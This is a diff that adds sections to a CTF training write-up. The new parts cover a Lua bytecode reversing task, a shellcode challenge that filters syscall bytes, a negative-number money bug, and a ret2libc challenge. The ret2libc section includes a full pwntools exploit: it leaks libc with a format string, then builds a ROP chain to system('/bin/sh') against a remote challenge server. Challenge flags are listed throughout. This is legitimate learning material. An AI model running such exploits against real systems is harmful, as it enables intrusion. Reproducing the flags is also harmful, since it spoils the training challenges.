@@ -395,6 +395,15 @@ print(xor_decrypt(TARGET, KEY))
 
 Flag: `BKSEC{py3-2-3xe_2024_12_29_ok}`  
 
+## babylua
+
+Decompile lua precompiled code using `https://lua-bytecode.github.io/`. Then I use Gemini Pro to reverse `flag.lua`.
+
+Flag: `BKSEC{ju$t_h@rd3r_2_re@d_:P}`
+
+Refers to this gemini chat: `https://gemini.google.com/share/aa871c799aee`
+
+
 # Pwn
 
 ## Introduction to pwntools
@@ -843,3 +852,203 @@ $ pwn checksec shell_1
     Stripped:   No
 ```
 
+`main()` decompiled by IDA Pro:
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int i; // [rsp+4h] [rbp-Ch]
+  char *s; // [rsp+8h] [rbp-8h]
+
+  setbuf(_bss_start, 0LL);
+  s = (char *)mmap((void *)0x1337000, 0x100uLL, 7, 50, -1, 0LL);// Add r-w-x permission to 0x1337000
+  if ( s == (char *)-1LL )
+  {
+    perror("mmap");
+    exit(1);
+  }
+  printf("Enter your shellcode (max %d bytes):\n", 256);
+  fgets(s, 256, stdin);
+  for ( i = 0; s[i]; ++i )
+  {
+    if ( *(_WORD *)&s[i] == 1295 )
+    {
+      puts("Sorry no syscall");
+      exit(1);
+    }
+  }
+  ((void (*)(void))s)();                        // Cast string s into function and execute it
+  munmap(s, 0x100uLL);
+  return 0;
+}
+```
+
+So we need to input a shellcode to get shell. But the problem is the program blocked `syscall`:
+
+```c
+if ( *(_WORD *)&s[i] == 1295 )
+{
+  puts("Sorry no syscall");
+  exit(1);
+}
+```
+
+So the idea is using **self-modifying code**. Honestly I'm not really understand these shellcode.
+
+![alt text](image-9.png)
+
+Flag: `BKSEC{sHe_5ell_seA_sh3ll}`
+
+## index_1
+
+The program forgot to check negetive number input. We can exploit this to get unlimited money. Then use option 6 to get shell and cat the `flag.txt`.
+
+![alt text](image-10.png)
+
+Flag: `BKSEC{wHy_bUY_p@PC@i1_in5T34D_0f_f1A9}`
+
+## ret2libc
+
+```bash
+$ file bof
+bof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ef6111e69705587a9edbe570cbf39b538cde4f3f, for GNU/Linux 3.2.0, stripped
+```
+```bash
+$ pwn checksec bof
+[*] '/mnt/e/ctf-chall/bksec_training/pwn/ret2libc/bof'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+```
+
+Use IDA Pro I get pseudo-code of the program. I modified the value so it be easy to understand.
+
+```c
+__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  char s[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  init();
+  printf("Enter your name: ");
+  fgets(s, 32, stdin);
+  sub_401303(s);
+  return 0LL;
+}
+
+__int64 __fastcall sub_401303(const char *a1)
+{
+  char v2[112]; // [rsp+10h] [rbp-70h] BYREF
+
+  printf(a1);                                   // format string vuln
+  printf("Input your string: ");
+  gets(v2);                                     // buffer overflow vuln here
+  printf("Here's your string: %s", v2);
+  return 0LL;
+}
+```
+
+This is a new technique, so I spend some time to learn it properly.
+
+Resources I use:
+- `https://www.youtube.com/watch?v=XX9sA90xN64`
+- `https://gemini.google.com/share/b5568566e93a`
+
+As the challenge name suggested, I use a technique called `ret2libc`. This technique have 2 stage.
+
+But first I patched the binary with the given `libc.so.6` using `pwninit`.
+
+```bash
+$ pwninit
+bin: ./bof
+libc: ./libc.so.6
+
+fetching linker
+https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.35-0ubuntu3.8_amd64.deb
+copying ./bof to ./bof_patched
+running patchelf on ./bof_patched
+writing solve.py stub
+```
+
+### Stage 1: Leak libc address.
+We use the format string vuln to leak the libc address. I use gdb to inspect the stack frame.
+
+![alt text](image-13.png)
+
+Here we have `_IO_2_1_stdin_`. This is a global variable in libc. I will exploit the format string vuln to leak this address. Base on `x86 calling convention`, we can calculate the offset to this variable. So the payload to leak this address is: `%12$p`.
+
+Now I calculate libc base address. Simply use the leaked `_IO_2_1_stdin_` subtract the offset symbol we already have.
+
+```py
+from pwn import *
+
+exe = ELF("./bof_patched")
+libc = ELF("./libc.so.6")
+
+context.binary = exe
+
+# p = process(exe.path)
+p = remote("103.77.175.40", 6035)
+
+
+# Stage 1: Leak libc
+main_addr = 0x0040136B
+
+p.sendlineafter(b"Enter your name: ", b"%12$p")
+libc_leak = int(p.recvline(), 0)
+
+libc.address = libc_leak - libc.sym["_IO_2_1_stdin_"]
+
+log.info(f"Libc leak: {hex(libc_leak)}")
+log.info(f"Libc base: {hex(libc.address)}")
+```
+
+### Stage 2: Spawn shell
+Known the libc address, now it became simple. Just build a rop chain exploit the buffer overflow vuln. I have the offset to the stack using `Cutter`.
+
+![alt text](image-12.png)
+
+This is full script exploit this challenge.
+
+```py
+from pwn import *
+
+exe = ELF("./bof_patched")
+libc = ELF("./libc.so.6")
+
+context.binary = exe
+
+# p = process(exe.path)
+p = remote("103.77.175.40", 6035)
+
+
+# Stage 1: Leak libc
+main_addr = 0x0040136B
+
+p.sendlineafter(b"Enter your name: ", b"%12$p")
+libc_leak = int(p.recvline(), 0)
+
+libc.address = libc_leak - libc.sym["_IO_2_1_stdin_"]
+
+log.info(f"Libc leak: {hex(libc_leak)}")
+log.info(f"Libc base: {hex(libc.address)}")
+
+# Stage 2: Get shell
+pop_rdi_ret = ROP(libc).find_gadget(["pop rdi", "ret"])[0]
+bin_sh = next(libc.search(b"/bin/sh"))
+system = libc.sym["system"]
+ret_gadget = 0x000000000040101A
+
+payload = flat(b"A" * 0x78, ret_gadget, pop_rdi_ret, bin_sh, system)
+
+p.sendlineafter(b"Input your string: ", payload)
+p.interactive()
+
+```
+
+![alt text](image-11.png)
+
+Flag: `BKSEC{buff3t_0verfl0w_supppper_Ezz}`.
